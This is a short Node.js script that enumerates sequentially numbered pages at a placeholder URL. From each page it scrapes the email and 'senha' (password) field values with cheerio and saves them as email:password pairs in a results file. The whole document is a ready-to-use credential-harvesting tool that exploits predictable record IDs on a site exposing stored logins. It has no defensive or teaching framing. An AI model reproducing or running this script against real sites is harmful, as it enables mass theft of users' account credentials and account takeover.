'use strict';

/**
 * Dependencies
 */
const cheerio = require('cheerio');
const HTTP    = require('http');
const FS      = require('fs');

/**
 * Constants
 */
const URL = 'URL_HERE';
const INITIAL_INDEX = 1;
const AMOUNT_OF_PAGES = 1000;
const OUTPUT_PATH = './results.txt';

(function main() {

	// Make the request
	function request(index) {
		console.log(`Starting ${index} (${index - INITIAL_INDEX}/${AMOUNT_OF_PAGES})`);

		HTTP.get(URL + index, res => {
			let output = '';

			res.on('data', chunk => {
				output += chunk;
			});

			res.on('end', () => {
				console.log(`Finished ${index} (${index - INITIAL_INDEX}/${AMOUNT_OF_PAGES})`);
				process(index, output);
			});
		});
	}

	// Process the request's response
	function process(index, data) {
		const $ = cheerio.load(data.toString());

		try {
			const email = $('#email')[0].attribs.value;
			const passw = $('#senha')[0].attribs.value;

			if (email && passw) {
				resultsMap[index] = {
					email: email,
					passw: passw,
				};
			}

		} catch (e) { }

		if (index < (INITIAL_INDEX + AMOUNT_OF_PAGES)) {
			request(index + 1);
		} else {
			finalize();
		}
	}

	// Finalize before ending execution
	function finalize() {
		//console.log(JSON.stringify(resultsMap));

		let output = '';
		for (let key in resultsMap) {
			const item = resultsMap[key];
			output += `${item.email}:${item.passw}\n`;
		}

		FS.writeFile(OUTPUT_PATH, output, () => {
			console.log("FINISHED!");
		});
	}

	let resultsMap = {};
	request(INITIAL_INDEX);

})();
